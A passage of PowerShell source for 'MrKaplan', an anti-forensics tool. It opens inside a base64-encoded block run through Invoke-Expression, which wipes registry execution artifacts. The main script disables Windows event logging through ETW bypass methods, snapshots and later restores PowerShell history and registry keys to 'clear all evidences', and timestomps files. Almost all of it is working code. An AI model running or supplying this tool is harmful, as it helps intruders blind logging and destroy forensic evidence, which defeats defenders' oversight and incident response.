iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLk5UQWNjb3VudCgkdXNlcikpLlRyYW5zbGF0ZShbU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXJdKS5WYWx1ZQoKICAgICAgICAjIENoZWNraW5nIGlmIHRoZSB1c2VyIGhhcyBiYW0ga2V5LgogICAgICAgIGlmICghKFRlc3QtUGF0aCAiJCgkYmFtS2V5KVwkKCRzaWQpIikpIHsKICAgICAgICAgICAgY29udGludWUKICAgICAgICB9CiAgICAgICAgJHVzZXJCYW1LZXkgPSBHZXQtSXRlbSAiJCgkYmFtS2V5KVwkKCRzaWQpIgoKICAgICAgICAjIFNlYXJjaGluZyBmb3IgdmFsdWVzIGNyZWF0ZWQgd2l0aGluIHRoZSByYW5nZSBvZiB0aGUgdGltZXNwYW4uCiAgICAgICAgZm9yZWFjaCAoJHZhbHVlTmFtZSBpbiAkdXNlckJhbUtleS5HZXRWYWx1ZU5hbWVzKCkpIHsKICAgICAgICAgICAgaWYgKCR2YWx1ZU5hbWUgLWVxICJWZXJzaW9uIiAtb3IgJHZhbHVlTmFtZSAtZXEgIlNlcXVlbmNlTnVtYmVyIikgewogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJHRpbWVzdGFtcCA9IEdldC1EYXRlIChbRGF0ZVRpbWVdOjpGcm9tRmlsZVRpbWVVdGMoW2JpdGNvbnZlcnRlcl06OlRvSW50NjQoJCgkdXNlckJhbUtleS5HZXRWYWx1ZSgkdmFsdWVOYW1lKSlbMC4uN10sMCkpKQogICAgICAgICAgICAkZGVsdGEgPSAkdGltZXN0YW1wIC0gJHRpbWUKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICgkZGVsdGEgLWd0IDApIHsKCQkgICAgICAgIFJlbW92ZS1JdGVtUHJvcGVydHkgLVBhdGggIiQoJGJhbUtleSlcJCgkc2lkKSIgLU5hbWUgJHZhbHVlTmFtZQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgV3JpdGUtSG9zdCAiWytdIFJlbW92ZWQgYmFtIGtleSBhcnRpZmFjdHMhIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuCiAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmCgogICAgcmV0dXJuICR0cnVlCn0KCmZ1bmN0aW9uIENsZWFyLVVzZXJBc3Npc3QgewogICAgcGFyYW0gKAogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkdGltZSwKCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICR1c2VycwogICAgKQoKICAgICMgUmVnaXN0cmluZyB0aGUgSEtFWV9VU0VSUyBoaXZlLgogICAgTmV3LVBTRHJpdmUgLVBTUHJvdmlkZXIgUmVnaXN0cnkgLU5hbWUgSEtVIC1Sb290IEhLRVlfVVNFUlMKICAgICR1c2VyQXNzaXN0S2V5UGF0aCA9ICJTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxVc2VyQXNzaXN0IgoKICAgIGZvcmVhY2ggKCR1c2VyIGluICR1c2VycykgewogICAgICAgICRzaWQgPSAkKE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5OVEFjY291bnQoJHVzZXIpKS5UcmFuc2xhdGUoW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyXSkuVmFsdWUKCiAgICAgICAgIyBDaGVja2luZyBpZiB0aGUgdXNlciBoYXMgdXNlciBhc3Npc3Qga2V5LgogICAgICAgIGlmICghKFRlc3QtUGF0aCAiSEtVOlwkKCRzaWQpXCQoJHVzZXJBc3Npc3RLZXlQYXRoKSIpKSB7CiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgfQogICAgICAgICR1c2VyQXNzaXN0S2V5ID0gR2V0LUl0ZW0gIkhLVTpcJCgkc2lkKVwkKCR1c2VyQXNzaXN0S2V5UGF0aCkiCgogICAgICAgICMgU2VhcmNoaW5nIGZvciB2YWx1ZXMgY3JlYXRlZCB3aXRoaW4gdGhlIHJhbmdlIG9mIHRoZSB0aW1lc3Bhbi4KICAgICAgICBmb3JlYWNoICgkc3ViS2V5TmFtZSBpbiAkdXNlckFzc2lzdEtleS5HZXRTdWJLZXlOYW1lcygpKSB7CiAgICAgICAgICAgICRjdXJyZW50VXNlckFzc2lzdEtleSA9IEdldC1JdGVtICJIS1U6XCQoJHNpZClcJCgkdXNlckFzc2lzdEtleVBhdGgpXCQoJHN1YktleU5hbWUpXENvdW50IgoKICAgICAgICAgICAgZm9yZWFjaCAoJHZhbHVlTmFtZSBpbiAkY3VycmVudFVzZXJBc3Npc3RLZXkuR2V0VmFsdWVOYW1lcygpKSB7CiAgICAgICAgICAgICAgICBpZiAoJHZhbHVlTmFtZSAtZXEgIkhSWlJfUEdZRlJGRlZCQSIpIHsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRyYXdUaW1lc3RhbXAgPSAkY3VycmVudFVzZXJBc3Npc3RLZXkuR2V0VmFsdWUoJHZhbHVlTmFtZSkKCiAgICAgICAgICAgICAgICAjIFRvIGNvdmVyIHRoZSBXaW5kb3dzIDcgYW5kIFdpbmRvd3MgNyBhbmQgb253YXJkcyB2ZXJzaW9ucy4KICAgICAgICAgICAgICAgIGlmICgkcmF3VGltZXN0YW1wLkxlbmd0aCAtZ3QgNjgpIHsKICAgICAgICAgICAgICAgICAgICAkdGltZXN0YW1wID0gR2V0LURhdGUgKFtEYXRlVGltZV06OkZyb21GaWxlVGltZShbYml0Y29udmVydGVyXTo6VG9JbnQ2NCgkcmF3VGltZXN0YW1wLDYwKSkpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkdGltZXN0YW1wID0gR2V0LURhdGUgKFtEYXRlVGltZV06OkZyb21GaWxlVGltZShbYml0Y29udmVydGVyXTo6VG9JbnQ2NCgkcmF3VGltZXN0YW1wLDgpKSkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkZGVsdGEgPSAkdGltZXN0YW1wIC0gJHRpbWUKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgKCRkZWx0YSAtZ3QgMCkgewogICAgICAgICAgICAgICAgICAgIFJlbW92ZS1JdGVtUHJvcGVydHkgLVBhdGggIkhLVTpcJCgkc2lkKVwkKCR1c2VyQXNzaXN0S2V5UGF0aClcJCgkc3ViS2V5TmFtZSlcQ291bnQiIC1OYW1lICR2YWx1ZU5hbWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIFdyaXRlLUhvc3QgIlsrXSBSZW1vdmVkIHVzZXIgYXNzaXN0IGFydGlmYWN0cyEiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4KfQoKZnVuY3Rpb24gQ2xlYXItQXBwQ29tcGF0Q2FjaGUgewogICAgcGFyYW0gKAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJGFwcENvbXBhdERhdGFQYXRoCiAgICApCiAgICBDb3B5LUl0ZW0gJGFwcENvbXBhdERhdGFQYXRoIC1EZXN0aW5hdGlvbiAiSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XENvbnRyb2xcU2Vzc2lvbiBNYW5hZ2VyXEFwcENvbXBhdENhY2hlIiAtRm9yY2UKICAgIFdyaXRlLUhvc3QgIlsrXSBSZW1vdmVkIEFwcENvbXBhdENhY2hlIGFydGlmYWN0cyEiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4KfQoKZnVuY3Rpb24gQ2xlYXItQ29tRGxnMzIgewogICAgcGFyYW0gKAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHJvb3RLZXlQYXRoLAoKICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJHVzZXJzCiAgICApCiAgICBOZXctUFNEcml2ZSAtUFNQcm92aWRlciBSZWdpc3RyeSAtTmFtZSBIS1UgLVJvb3QgSEtFWV9VU0VSUwogICAgJGNvbURsZzMyUGF0aCA9ICJTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlciIKCiAgICBmb3JlYWNoICgkdXNlciBpbiAkdXNlcnMpIHsKICAgICAgICAkc2lkID0gJChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuTlRBY2NvdW50KCR1c2VyKSkuVHJhbnNsYXRlKFtTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcl0pLlZhbHVlCgogICAgICAgICMgQ2hlY2tpbmcgaWYgdGhlIHVzZXIgaGFzIHVzZXIgYXNzaXN0IGtleS4KICAgICAgICBpZiAoIShUZXN0LVBhdGggIkhLVTpcJCgkc2lkKVwkKCRjb21EbGczMlBhdGgpIikpIHsKICAgICAgICAgICAgY29udGludWUKICAgICAgICB9CgogICAgICAgIENvcHktSXRlbSAiJCgkcm9vdEtleVBhdGgpXFVzZXJzXCQoJHVzZXIpXENvbURsZzMyIiAtRGVzdGluYXRpb24gIkhLVTpcJCgkc2lkKVwkKCRjb21EbGczMlBhdGgpIiAtRm9yY2UgLVJlY3Vyc2UKICAgIH0KCiAgICBXcml0ZS1Ib3N0ICJbK10gUmVtb3ZlZCBDb21EbGczMiBhcnRpZmFjdHMhIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuCn0=")) | Invoke-Expression

# The main code
$rootKeyPath = "HKCU:\Software\MrKaplan"
$PSDefaultParameterValues['*:Encoding'] = 'utf8'
$usage = "`n[*] Possible Usage:`n`n[*] Show help message:`n`t.\MrKaplan.ps1 help`n`n[*] For config creation and start:`n`t.\MrKaplan.ps1 begin`n`t.\MrKaplan.ps1 begin -Users Reddington,Liz`n`t.\MrKaplan.ps1 begin -Users Reddington`n`t.\MrKaplan.ps1 begin -EtwBypassMethod overflow`n`t.\MrKaplan.ps1 begin -RunAsUser`n`t.\MrKaplan.ps1 begin -Exclusions BamKey, OfficeHistory`n`n[*] For cleanup:`n`t.\MrKaplan.ps1 end`n`n[*] To save file's timestamps:`n`t.\MrKaplan.ps1 timestomp -StompedFilePath C:\path\to\file`n`n"

function New-Config {
    param (
        [String[]]
        $users,

        [String]
        $etwBypassMethod,

        [String[]]
        $exclusions
    )
    New-PSDrive -PSProvider Registry -Name HKU -Root HKEY_USERS
    
    if (Test-Path $rootKeyPath) {
        Write-Host '[-] Config already exists in registry, please delete the current (Remove-Item –Path "HKCU:\Software\MrKaplan" –Recurse -Verbose) and rerun.' -ForegroundColor Red
        return $false
    }
    New-Item -Path $rootKeyPath
    New-Item -Path $rootKeyPath -Name "Users"

    if (-not $exclusions) {
        $exclusions = @()
    }

    # Stopping the event logging.
    if (-not $runAsUser) {
        New-ItemProperty -Path $rootKeyPath -Name "RunAsUser" -PropertyType "DWord" -Value $false

        if (-not $exclusions.Contains("eventlogs")) {
            Write-Host "[*] Stopping event logging..." -ForegroundColor Gray

            if ($etwBypassMethod -eq "overflow") {
                Write-Host "[*] This method won't allow any regular user to log in until you end MrKaplan." -ForegroundColor Yellow

                if ($(Read-Host "Are you sure? [y/n]") -eq "y") {
                    $etwMetadata = Get-EventLogsSettings

                    if ($etwMetadata.Count -eq 0) {
                        return $false
                    }
                    
                    if (!$(Clear-EventLogging)) {
                        return $false
                    }

                    New-Item -Path $rootKeyPath -Name "EventLogSettings"
                    foreach ($setting in $etwMetadata.GetEnumerator()) {
                        New-ItemProperty -Path "$($rootKeyPath)\EventLogSettings" -Name $setting.Name -Value $setting.Value
                    }
                }
                else {
                    Write-Host "[-] Exiting..." -ForegroundColor Red
                    return $false
                }
            }
            elseif ($etwBypassMethod -eq "suspend" -or $etwBypassMethod -eq "") {
                $etwMetadata = Invoke-SuspendEtw

                if ($etwMetadata.Count -eq 0) {
                    return $false
                }
                
                New-Item -Path $rootKeyPath -Name "EventLogSettings"
                foreach ($setting in $etwMetadata[1].GetEnumerator()) {
                    New-ItemProperty -Path "$($rootKeyPath)\EventLogSettings" -Name $setting.Name -Value $setting.Value
                }
                
            }
            else {
                Write-Host "[-] Unknown ETW patching method, exiting..." -ForegroundColor Red
                return $false
            }

            Write-Host "[+] Stopped event logging." -ForegroundColor Green
        }
        

        if (-not $exclusions.Contains("appcompatcache")) {
            Copy-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" -Destination "$($rootKeyPath)\AppCompatCache" -Force -Recurse
        }
    }
    else {
        New-ItemProperty -Path $rootKeyPath -Name "RunAsUser" -Value $true
        
    }

    if ($users) {
        if (!$runAsUser) {
            $users.Add($env:USERNAME)
        }
        else {
            Write-Host "[-] Cannot use both run as user and users!" -ForegroundColor Red
            return $false
        }
    }
    else {
        $users = @($env:USERNAME)
    }
    
    # Saving current time.
    New-ItemProperty -Path $rootKeyPath -Name "Time" -Value $(Get-Date).DateTime

    # Saving user data.
    $comDlg32Path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32"

    foreach ($user in $users) {

        if ($exclusions.Contains("pshistory")) {
            $powershellHistory = ""
        }
        else {
            $powershellHistoryFile = "C:\Users\$($user)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

            if (Test-Path $powershellHistoryFile) {
                $powershellHistory = [Convert]::ToBase64String([IO.File]::ReadAllBytes($powershellHistoryFile))
            }
            else {
                $powershellHistory = ""
            }
        }

        New-Item -Path "$($rootKeyPath)\Users" -Name $user
        New-ItemProperty -Path "$($rootKeyPath)\Users\$($user)" -Name "PSHistory" -Value $powershellHistory

        if (-not $exclusions.Contains("comdlg32")) {
            $sid = $(New-Object System.Security.Principal.NTAccount($user)).Translate([System.Security.Principal.SecurityIdentifier]).Value
            
            if (!(Test-Path "HKU:\$($sid)\$($comDlg32Path)")) {
                continue
            }
            Copy-Item "HKU:\$($sid)\$($comDlg32Path)" -Destination "$($rootKeyPath)\Users\$($user)\ComDlg32" -Force -Recurse
        }
    }

    New-ItemProperty -Path $rootKeyPath -Name "Exclusions" -Value $exclusions
      
    return $true
}

function Clear-Evidence {
    $ErrorActionPreference = "SilentlyContinue" ; Set-StrictMode -Off
    $result = $true

    # Parsing the config.
    if (-not (Test-Path $rootKeyPath)) {
        Write-Host "[-] Config doesn't exist" -ForegroundColor Red
        return $false
    }

    # Running the modules on each user.
    Write-Host "[*] Cleaning logs..." -ForegroundColor Gray
    $users = $(Get-ChildItem -Path "$($rootKeyPath)\Users" | Select-Object PSChildName).PSChildName
    $runAsUser =$(Get-ItemProperty -Path $rootKeyPath -Name "RunAsUser").RunAsUser
    $time = $(Get-ItemProperty -Path $rootKeyPath -Name "Time").Time
    $exclusions = $(Get-ItemProperty -Path $rootKeyPath -Name "Exclusions").Exclusions

    # Stomping the files.
    $filesToStomp = @{}

    if (Test-Path "$($rootKeyPath)\StompedFiles") {
        $regFilesToStomp = Get-ItemProperty "$($rootKeyPath)\StompedFiles"
        $regFilesToStomp.PsObject.Properties | 
            ForEach-Object {
                $filesToStomp[$_.Name] = $_.Value
            }
    }
    Invoke-StompFiles $filesToStomp
    
    foreach ($user in $users) {
        $psHistory = $(Get-ItemProperty -Path "$($rootKeyPath)\Users\$($user)" -Name "PSHistory").PSHistory
        if (-not $(Clear-Files $time $psHistory $user $runAsUser $exclusions)) {
            Write-Host "[-] Failed to clean files for $($user)." -ForegroundColor Red
            $result = $false
        }
    }

    if (!$(Clear-Registry $time $users $runAsUser $exclusions $rootKeyPath)) {
        Write-Host "[-] Failed to cleanup the registry." -ForegroundColor Red
        $result = $false
    }

    # Restoring the event logging.
    if (!$runAsUser -and -not $exclusions.Contains("eventlogs")) {
        Write-Host "[*] Restoring event logging..." -ForegroundColor Gray

        if (Test-Path "$($rootKeyPath)\EventLogSettings") {
            $etwMetadata = @{}
            $regEventLog = Get-ItemProperty "$($rootKeyPath)\EventLogSettings"
            $regEventLog.PsObject.Properties | 
                ForEach-Object {
                    $etwMetadata[$_.Name] = $_.Value
                }

            if (!$(Invoke-RestoreEtw $etwMetadata)) {
                Write-Host "[-] Failed to restore the eventlogging." -ForegroundColor Red
                $result = $false
            }
        }
    }
    
    if ($result) {
        Write-Host "[+] Restored! Be careful with your actions now." -ForegroundColor Green
    }
    else {
        Write-Host "[!] Finished with partial restoration." -ForegroundColor Yellow
    }

    return $result
}

if ($operation -eq "begin") {
    for ($i = 0; $i -lt $exclusions.Count; $i++) { 
        $exclusions[$i] = $exclusions[$i].ToLower() 
    }

    if (New-Config $users $etwBypassMethod $exclusions) {
        Write-Host "`n[+] Saved required information!`n[+] You can do your operations." -ForegroundColor Green
    }
    else {
        Write-Host "`n[-] Failed to create config file." -ForegroundColor Red
    }
}

elseif ($operation -eq "end") {
    if (Clear-Evidence) {
        Write-Host "`n[+] All evidences cleared!" -ForegroundColor Green
    }
    else {
        Write-Host "`n[-] Failed to clear all evidences." -ForegroundColor Red
    }
}

elseif ($operation -eq "timestomp") {
    if (Invoke-LogFileToStomp $rootKeyPath $stompedFilePath) {
        Write-Host "`n[+] Saved file's timestamps." -ForegroundColor Green
    }       
    else {
        Write-Host "`n[-] Failed to save timestamps." -ForegroundColor Red
    }
}

elseif ($operation -eq "help") {
    Write-Host $usage -ForegroundColor Gray
}

else {
    Write-Host "`n[!] Invalid Usage!" -ForegroundColor Red
    Write-Host $usage -ForegroundColor Gray
}